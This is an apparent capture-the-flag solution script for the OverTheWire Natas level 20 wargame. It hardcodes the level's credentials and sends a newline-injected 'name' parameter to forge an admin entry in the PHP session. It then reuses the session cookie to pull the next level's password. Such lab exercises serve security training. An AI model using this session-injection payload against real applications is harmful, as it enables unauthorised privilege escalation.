#!/usr/bin/env python3
'''
Level 20 → Level 21
https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas20.md
github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas20.py
https://www.youtube.com/watch?v=6UiRRF1mbaU&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=18


Username: natas20
URL:      http://natas20.natas.labs.overthewire.org
username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
problem: You are logged in as a regular user.
      Login as an admin to retrieve credentials for natas21.


write up:


'''
import string

import requests
#pip uninstall uuid pip install uuid
import re
from string import *

from time import *



import requests

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

print ("#")
print ("# FIRST REQUEST")
print ("#")
params = dict(name='admin\nadmin 1', debug='') # <-- this is the key part
#             ^^^^^^^^^^^^^^^^^^^^^
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print (r.text)

print ("\n\n")
print ("#")
print ("# SECOND REQUEST")
print ("#")
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print (r.text)

print ("\nPassword for natas21 = ", re.findall('Password: (.*)',r.text)[0])


